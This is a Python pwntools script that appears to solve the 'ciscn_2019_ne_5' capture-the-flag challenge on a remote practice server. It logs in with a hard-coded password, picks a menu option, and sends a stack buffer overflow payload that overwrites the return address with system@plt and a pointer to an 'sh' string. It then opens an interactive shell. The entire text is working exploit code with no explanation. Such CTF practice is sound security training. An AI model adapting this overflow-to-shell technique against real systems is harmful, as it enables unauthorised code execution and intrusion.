from pwn import *
io = remote('node3.buuoj.cn',27838)
elf = ELF('./ciscn_2019_ne_5')
puts_got = elf.got['puts']
password = 'administrator'
select = '1'
system_plt = elf.plt['system']
sh = 0x80482ea


io.recvuntil('password:')
io.sendline(password)
io.recvuntil('Exit\n:')
io.sendline(select)
io.recvuntil('info:')
payload = cyclic(0x48+4)+p32(system_plt)+p32(0xdeadbeef)+p32(sh)
io.sendline(payload)
io.recvuntil('Exit\n:')
select='4'
io.sendline(select)
io.interactive()

